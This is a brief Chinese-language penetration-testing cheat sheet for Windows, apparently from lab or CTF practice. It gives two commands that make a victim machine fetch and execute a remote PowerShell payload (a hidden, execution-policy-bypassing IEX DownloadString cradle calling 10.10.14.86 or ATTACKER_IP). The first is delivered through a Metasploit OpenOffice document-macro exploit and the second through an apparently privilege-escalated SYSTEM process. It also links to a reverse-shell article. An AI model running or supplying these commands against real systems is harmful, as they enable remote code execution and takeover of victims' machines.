## Windows

```
[★]$ msfconsole //官方文件总是消失的命令
```
————————————————————————————————————
### 总结 一样命令的区别 form Job
#### PowerShell 反向 shell 文件
https://amanutkhedkar.medium.com/powershell-reverse-shell-via-social-engineering-toolkit-591ca034a12d
#### 第一条：让“受害文档里的宏代码”去执行 PowerShell
```
msf6 exploit(multi/misc/openoffice_document_macro) > set cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.86/shell.txt');" 
```
#### 第二条：让“已经提权成功的 SYSTEM 进程（god.exe）”去执行 PowerShell
```
c:\ProgramData>.\god.exe -cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.txt');"
```
————————————————————————————————————
